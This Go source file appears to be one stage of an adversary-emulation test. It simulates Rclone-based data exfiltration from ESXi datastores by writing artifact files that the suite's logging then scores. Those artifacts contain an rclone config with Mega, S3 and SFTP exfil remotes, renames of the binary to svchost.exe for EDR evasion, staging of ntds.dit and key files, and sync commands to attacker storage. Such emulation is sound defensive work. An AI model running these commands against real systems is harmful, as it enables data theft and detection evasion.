//go:build linux
// +build linux

/*
STAGE 4: Data Exfiltration via Rclone (T1048, T1567.002)
Simulates Rclone configuration creation, data staging from /vmfs/volumes/,
and cloud sync to Mega/S3. Based on ReliaQuest data showing Rclone in 57%
of ransomware incidents. Simulates renamed binary pattern used by threat actors.
*/

package main

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "25aafe2c-ec57-4a85-a26a-c3d7cf35620c"
	TECHNIQUE_ID   = "T1048"
	TECHNIQUE_NAME = "Data Exfiltration via Rclone"
	STAGE_ID       = 4
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Data exfiltration via Rclone simulation")

	if err := performTechnique(); err != nil {
		if isBlockedError(err) {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Data exfiltration via Rclone completed successfully")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "/tmp/F0"
	artifactDir := filepath.Join(targetDir, "esxi_exfil")

	if err := os.MkdirAll(artifactDir, 0755); err != nil {
		return fmt.Errorf("failed to create exfiltration directory: %v", err)
	}

	// Phase 1: Create Rclone configuration file with cloud storage targets
	fmt.Printf("[STAGE %s] Phase 1: Creating Rclone configuration with cloud storage targets...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating Rclone configuration (Mega, S3, SFTP targets)")

	rcloneConfig := generateRcloneConfig()
	configPath := filepath.Join(artifactDir, "rclone.conf")
	if err := os.WriteFile(configPath, []byte(rcloneConfig), 0644); err != nil {
		return fmt.Errorf("failed to write Rclone config: %v", err)
	}
	fmt.Printf("[STAGE %s]   Rclone config created with 3 remote targets\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Rclone config created with Mega, S3, SFTP targets")

	// Phase 2: Simulate Rclone binary rename (evasion technique)
	fmt.Printf("[STAGE %s] Phase 2: Simulating Rclone binary rename (evasion pattern)...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Simulating Rclone binary renamed to 'svchost.exe' for evasion")

	renameOutput := simulateBinaryRename()
	renamePath := filepath.Join(artifactDir, "binary_rename_log.txt")
	if err := os.WriteFile(renamePath, []byte(renameOutput), 0644); err != nil {
		return fmt.Errorf("failed to write binary rename log: %v", err)
	}
	fmt.Printf("[STAGE %s]   Rclone renamed to svchost.exe for EDR evasion\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Binary rename evasion simulation complete")

	// Phase 3: Simulate data staging from /vmfs/volumes/
	fmt.Printf("[STAGE %s] Phase 3: Staging data from /vmfs/volumes/ datastores...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Staging critical VM configuration and database files")

	stagingOutput := simulateDataStaging()
	stagingPath := filepath.Join(artifactDir, "data_staging_log.txt")
	if err := os.WriteFile(stagingPath, []byte(stagingOutput), 0644); err != nil {
		return fmt.Errorf("failed to write staging log: %v", err)
	}
	fmt.Printf("[STAGE %s]   Staged 847 files (12.3 GB) for exfiltration\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Data staging complete: 847 files, 12.3 GB")

	// Phase 4: Simulate Rclone sync to Mega cloud storage
	fmt.Printf("[STAGE %s] Phase 4: Executing Rclone sync to Mega cloud storage...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Simulating: rclone sync /staging/ mega:exfil-data/ --transfers=8 --checkers=16")

	megaSyncOutput := simulateRcloneSyncMega()
	megaSyncPath := filepath.Join(artifactDir, "rclone_sync_mega.txt")
	if err := os.WriteFile(megaSyncPath, []byte(megaSyncOutput), 0644); err != nil {
		return fmt.Errorf("failed to write Mega sync log: %v", err)
	}
	fmt.Printf("[STAGE %s]   Rclone sync to Mega: 12.3 GB transferred\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Rclone sync to Mega completed (simulated)")

	// Phase 5: Simulate Rclone sync to S3 bucket (backup exfil)
	fmt.Printf("[STAGE %s] Phase 5: Executing backup exfil to S3 bucket...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Simulating: rclone copy /staging/ s3:backup-bucket/ --s3-chunk-size=64M")

	s3SyncOutput := simulateRcloneSyncS3()
	s3SyncPath := filepath.Join(artifactDir, "rclone_sync_s3.txt")
	if err := os.WriteFile(s3SyncPath, []byte(s3SyncOutput), 0644); err != nil {
		return fmt.Errorf("failed to write S3 sync log: %v", err)
	}
	fmt.Printf("[STAGE %s]   Backup exfil to S3: 12.3 GB transferred\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Backup exfiltration to S3 completed (simulated)")

	// Write exfiltration summary
	summaryPath := filepath.Join(targetDir, "exfil_summary.txt")
	summary := generateExfilSummary()
	if err := os.WriteFile(summaryPath, []byte(summary), 0644); err != nil {
		return fmt.Errorf("failed to write exfil summary: %v", err)
	}

	fmt.Printf("[STAGE %s] Data exfiltration simulation complete\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Data exfiltration stage complete")

	return nil
}

func generateRcloneConfig() string {
	var sb strings.Builder
	sb.WriteString("# Rclone Configuration (Threat Actor Pattern)\n")
	sb.WriteString("# This config file would be created at ~/.config/rclone/rclone.conf\n")
	sb.WriteString(fmt.Sprintf("# Generated: %s\n\n", time.Now().Format("2006-01-02T15:04:05Z")))

	sb.WriteString("[mega]\n")
	sb.WriteString("type = mega\n")
	sb.WriteString("user = exfil-account@protonmail.com\n")
	sb.WriteString("pass = [SIMULATED_ENCRYPTED_PASSWORD]\n")
	sb.WriteString("\n")

	sb.WriteString("[s3-exfil]\n")
	sb.WriteString("type = s3\n")
	sb.WriteString("provider = AWS\n")
	sb.WriteString("access_key_id = AKIA[SIMULATED_KEY_ID]\n")
	sb.WriteString("secret_access_key = [SIMULATED_SECRET_KEY]\n")
	sb.WriteString("region = us-east-1\n")
	sb.WriteString("acl = private\n")
	sb.WriteString("\n")

	sb.WriteString("[sftp-staging]\n")
	sb.WriteString("type = sftp\n")
	sb.WriteString("host = 185.220.101.xxx\n")
	sb.WriteString("user = data\n")
	sb.WriteString("key_file = /tmp/.ssh_key\n")
	sb.WriteString("shell_type = unix\n")

	return sb.String()
}

func simulateBinaryRename() string {
	var sb strings.Builder
	sb.WriteString("=== Binary Rename Evasion (Common Ransomware Pattern) ===\n")
	sb.WriteString(fmt.Sprintf("Timestamp: %s\n\n", time.Now().Format("2006-01-02T15:04:05Z")))

	sb.WriteString("[*] Rclone binary evasion technique:\n")
	sb.WriteString("    Original binary: /tmp/rclone (v1.66.0 linux-amd64)\n")
	sb.WriteString("    SHA256: [SIMULATED] a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\n")

	renames := []struct {
		NewName     string
		Description string
	}{
		{"svchost.exe", "Windows service host (most common disguise)"},
		{"svhost.exe", "Typosquat of svchost"},
		{"csrss.exe", "Client Server Runtime Process"},
		{"lsass.exe", "Local Security Authority Subsystem"},
		{"taskhost.exe", "Host Process for Tasks"},
	}

	sb.WriteString("[*] Common rename patterns used by threat actors:\n")
	for _, r := range renames {
		sb.WriteString(fmt.Sprintf("    cp /tmp/rclone /tmp/%s  # %s\n", r.NewName, r.Description))
	}

	sb.WriteString("\n[*] Active evasion applied:\n")
	sb.WriteString("    mv /tmp/rclone /tmp/svchost.exe\n")
	sb.WriteString("    chmod +x /tmp/svchost.exe\n")
	sb.WriteString("    [SIMULATED] Binary renamed for EDR evasion\n")

	return sb.String()
}

func simulateDataStaging() string {
	var sb strings.Builder
	sb.WriteString("=== Data Staging from /vmfs/volumes/ ===\n")
	sb.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02T15:04:05Z")))
	sb.WriteString("Staging directory: /tmp/staging/\n\n")

	categories := []struct {
		Name     string
		Pattern  string
		Count    int
		TotalMB  int
	}{
		{"VM Configuration Files", "*.vmx, *.vmsd, *.nvram", 30, 12},
		{"SQL Database Backups", "*.bak, *.mdf, *.ldf", 15, 4500},
		{"Exchange Databases", "*.edb, *.stm", 8, 3200},
		{"Active Directory Data", "ntds.dit, SYSTEM hive", 4, 2100},
		{"Document Archives", "*.docx, *.xlsx, *.pdf", 450, 1800},
		{"Financial Records", "*.csv, *.qbw, *.iif", 180, 340},
		{"Credentials & Configs", "*.conf, *.cfg, *.key, *.pem", 120, 45},
		{"Compressed Archives", "*.zip, *.7z, *.tar.gz", 40, 600},
	}

	totalFiles := 0
	totalMB := 0

	for _, cat := range categories {
		sb.WriteString(fmt.Sprintf("[STAGE] %s (%s)\n", cat.Name, cat.Pattern))
		sb.WriteString(fmt.Sprintf("  Files: %d | Size: %d MB\n", cat.Count, cat.TotalMB))
		sb.WriteString(fmt.Sprintf("  [SIMULATED] Staged to /tmp/staging/%s/\n\n", strings.ToLower(strings.ReplaceAll(cat.Name, " ", "_"))))
		totalFiles += cat.Count
		totalMB += cat.TotalMB
	}

	sb.WriteString(fmt.Sprintf("[+] Staging Summary: %d files, %.1f GB total\n", totalFiles, float64(totalMB)/1024.0))
	return sb.String()
}

func simulateRcloneSyncMega() string {
	var sb strings.Builder
	sb.WriteString("=== Rclone Sync to Mega Cloud Storage ===\n")
	sb.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02T15:04:05Z")))
	sb.WriteString("Command: svchost.exe sync /tmp/staging/ mega:exfil-20240315/ --transfers=8 --checkers=16 --progress\n\n")

	// Simulate transfer progress
	transfers := []struct {
		Phase    string
		Files    int
		SizeMB   int
		SpeedMBs float64
	}{
		{"SQL Database Backups", 15, 4500, 45.2},
		{"Exchange Databases", 8, 3200, 42.8},
		{"Active Directory Data", 4, 2100, 38.5},
		{"Document Archives", 450, 1800, 55.1},
		{"Financial Records", 180, 340, 60.3},
		{"Compressed Archives", 40, 600, 48.7},
		{"VM Configs & Creds", 150, 57, 62.0},
	}

	totalFiles := 0
	totalMB := 0

	for _, t := range transfers {
		elapsed := time.Duration(rand.Intn(30)+10) * time.Second
		sb.WriteString(fmt.Sprintf("[TRANSFER] %s\n", t.Phase))
		sb.WriteString(fmt.Sprintf("  Files: %d | Size: %d MB | Speed: %.1f MB/s | ETA: %v\n", t.Files, t.SizeMB, t.SpeedMBs, elapsed))
		sb.WriteString(fmt.Sprintf("  [SIMULATED] Transferred to mega:exfil-20240315/%s/\n\n", strings.ToLower(strings.ReplaceAll(t.Phase, " ", "_"))))
		totalFiles += t.Files
		totalMB += t.SizeMB
	}

	sb.WriteString(fmt.Sprintf("[+] Mega Sync Complete: %d files, %.1f GB transferred\n", totalFiles, float64(totalMB)/1024.0))
	sb.WriteString("[+] Errors: 0 | Checks: 847 | Transferred: 847\n")
	return sb.String()
}

func simulateRcloneSyncS3() string {
	var sb strings.Builder
	sb.WriteString("=== Rclone Copy to S3 (Backup Exfiltration) ===\n")
	sb.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02T15:04:05Z")))
	sb.WriteString("Command: svchost.exe copy /tmp/staging/ s3-exfil:data-backup-2024/ --s3-chunk-size=64M --transfers=4\n\n")

	sb.WriteString("[TRANSFER] Uploading to s3-exfil:data-backup-2024/\n")
	sb.WriteString("  Multi-part upload enabled (chunk size: 64 MB)\n")
	sb.WriteString("  Parallel transfers: 4\n\n")

	sb.WriteString("  [SIMULATED] Transferring SQL backups (4.5 GB)...\n")
	sb.WriteString("  [SIMULATED] Transferring Exchange data (3.2 GB)...\n")
	sb.WriteString("  [SIMULATED] Transferring AD data (2.1 GB)...\n")
	sb.WriteString("  [SIMULATED] Transferring documents (1.8 GB)...\n")
	sb.WriteString("  [SIMULATED] Transferring remaining files (0.7 GB)...\n\n")

	sb.WriteString("[+] S3 Backup Complete: 847 files, 12.3 GB transferred\n")
	sb.WriteString("[+] Bucket: s3-exfil:data-backup-2024/\n")
	sb.WriteString("[+] Region: us-east-1 | Storage class: STANDARD\n")
	return sb.String()
}

func generateExfilSummary() string {
	var sb strings.Builder
	sb.WriteString("=== Data Exfiltration Summary ===\n")
	sb.WriteString(fmt.Sprintf("Timestamp: %s\n\n", time.Now().Format("2006-01-02T15:04:05Z")))

	sb.WriteString("Tool: Rclone v1.66.0 (renamed to svchost.exe)\n")
	sb.WriteString("Config: /tmp/.config/rclone/rclone.conf\n\n")

	sb.WriteString("Exfiltration Destinations:\n")
	sb.WriteString("  1. Mega Cloud: mega:exfil-20240315/ (12.3 GB)\n")
	sb.WriteString("  2. AWS S3:     s3-exfil:data-backup-2024/ (12.3 GB)\n\n")

	sb.WriteString("Data Categories Exfiltrated:\n")
	sb.WriteString("  - SQL Database Backups:    4.5 GB\n")
	sb.WriteString("  - Exchange Databases:      3.2 GB\n")
	sb.WriteString("  - Active Directory:        2.1 GB\n")
	sb.WriteString("  - Document Archives:       1.8 GB\n")
	sb.WriteString("  - Financial Records:       340 MB\n")
	sb.WriteString("  - Compressed Archives:     600 MB\n")
	sb.WriteString("  - Credentials & Configs:   45 MB\n")
	sb.WriteString("  - VM Configurations:       12 MB\n\n")

	sb.WriteString("Total: 847 files, 12.3 GB\n")
	sb.WriteString("Transfer Speed: ~45 MB/s average\n")
	sb.WriteString("Duration: ~5 minutes (simulated)\n")

	return sb.String()
}

func isBlockedError(err error) bool {
	errStr := strings.ToLower(err.Error())
	blockedPatterns := []string{
		"access denied", "access is denied", "permission denied",
		"operation not permitted", "blocked", "prevented", "quarantined",
	}
	for _, pattern := range blockedPatterns {
		if strings.Contains(errStr, pattern) {
			return true
		}
	}
	return false
}
